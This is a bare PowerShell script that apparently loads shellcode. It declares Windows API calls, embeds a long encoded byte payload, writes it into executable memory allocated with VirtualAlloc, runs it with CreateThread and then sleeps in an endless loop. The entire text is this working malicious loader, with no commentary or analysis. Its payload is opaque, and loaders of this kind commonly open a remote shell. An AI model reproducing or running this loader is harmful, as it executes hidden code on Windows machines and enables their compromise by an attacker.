$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xd6,0xa2,0x75,0x10,0xdb,0xcf,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x31,0x78,0x13,0x03,0x78,0x13,0x83,0xe8,0x2a,0x40,0x80,0xec,0x3a,0x07,0x6b,0x0d,0xba,0x68,0xe5,0xe8,0x8b,0xa8,0x91,0x79,0xbb,0x18,0xd1,0x2c,0x37,0xd2,0xb7,0xc4,0xcc,0x96,0x1f,0xea,0x65,0x1c,0x46,0xc5,0x76,0x0d,0xba,0x44,0xf4,0x4c,0xef,0xa6,0xc5,0x9e,0xe2,0xa7,0x02,0xc2,0x0f,0xf5,0xdb,0x88,0xa2,0xea,0x68,0xc4,0x7e,0x80,0x22,0xc8,0x06,0x75,0xf2,0xeb,0x27,0x28,0x89,0xb5,0xe7,0xca,0x5e,0xce,0xa1,0xd4,0x83,0xeb,0x78,0x6e,0x77,0x87,0x7a,0xa6,0x46,0x68,0xd0,0x87,0x67,0x9b,0x28,0xcf,0x4f,0x44,0x5f,0x39,0xac,0xf9,0x58,0xfe,0xcf,0x25,0xec,0xe5,0x77,0xad,0x56,0xc2,0x86,0x62,0x00,0x81,0x84,0xcf,0x46,0xcd,0x88,0xce,0x8b,0x65,0xb4,0x5b,0x2a,0xaa,0x3d,0x1f,0x09,0x6e,0x66,0xfb,0x30,0x37,0xc2,0xaa,0x4d,0x27,0xad,0x13,0xe8,0x23,0x43,0x47,0x81,0x69,0x0b,0xa4,0xa8,0x91,0xcb,0xa2,0xbb,0xe2,0xf9,0x6d,0x10,0x6d,0xb1,0xe6,0xbe,0x6a,0xb6,0xdc,0x07,0xe4,0x49,0xdf,0x77,0x2c,0x8d,0x8b,0x27,0x46,0x24,0xb4,0xa3,0x96,0xc9,0x61,0x59,0x92,0x5d,0x4a,0x36,0x9d,0x89,0x22,0x45,0x9e,0xb0,0x09,0xc0,0x78,0xe2,0x3d,0x83,0xd4,0x42,0xee,0x63,0x85,0x2a,0xe4,0x6b,0xfa,0x4a,0x07,0xa6,0x93,0xe0,0xe8,0x1f,0xcb,0x9c,0x91,0x05,0x87,0x3d,0x5d,0x90,0xed,0x7d,0xd5,0x17,0x11,0x33,0x1e,0x5d,0x01,0xa3,0xee,0x28,0x7b,0x65,0xf0,0x86,0x16,0x89,0x64,0x2d,0xb1,0xde,0x10,0x2f,0xe4,0x28,0xbf,0xd0,0xc3,0x23,0x76,0x45,0xac,0x5b,0x77,0x89,0x2c,0x9b,0x21,0xc3,0x2c,0xf3,0x95,0xb7,0x7e,0xe6,0xd9,0x6d,0x13,0xbb,0x4f,0x8e,0x42,0x68,0xc7,0xe6,0x68,0x57,0x2f,0xa9,0x93,0xb2,0xb1,0x95,0x45,0xfa,0xc7,0xf7,0x55;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
